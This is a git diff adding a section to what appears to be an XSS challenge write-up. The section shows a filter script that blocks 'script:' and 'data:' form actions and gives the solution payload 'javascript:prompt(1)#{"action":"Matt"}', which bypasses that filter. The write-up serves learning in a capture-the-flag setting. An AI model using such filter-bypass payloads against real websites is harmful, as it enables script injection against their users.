@@ -201,4 +201,46 @@ But by moving ```="prompt(1)``` to next line, it will work.
 
 <img width="1000" src="https://user-images.githubusercontent.com/68285613/147786303-774c6d38-bdce-4241-87a2-665344fece7b.png">
 
+## 6
+**Explain**
+<img width="1000" src="https://user-images.githubusercontent.com/68285613/147860405-ca3b7431-5fac-448f-a2fe-bcd2d25f699a.png">
+
+```HTML
+<script>                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+        document.forms[0].submit();                       \n\
+    else                                                  \n\
+        document.write("Action forbidden.")               \n\
+</script>  
+```
+
+and
+
+```e.g. http://httpbin.org/post#{"name":"Matt"}```
+
+are the parts I focused on.
+
+<img width="1000" src="https://user-images.githubusercontent.com/68285613/147876362-6b56c465-40f2-4654-8685-8bb0c9cced1a.png">
+
+
+```HTML
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+```
+
+<img width="1000" src="https://user-images.githubusercontent.com/68285613/147876796-2bd172ef-af1d-45be-acbf-6c5469c7329b.png">
+
+By changing ```name``` to ```action```, it successfully perform prompt(1).
+
+**Solve**
+
+```JavaScript
+javascript:prompt(1)#{"action":"Matt"}
+```
+
+
+<img width="1000" src="https://user-images.githubusercontent.com/68285613/147876796-2bd172ef-af1d-45be-acbf-6c5469c7329b.png">
+
+
+
 
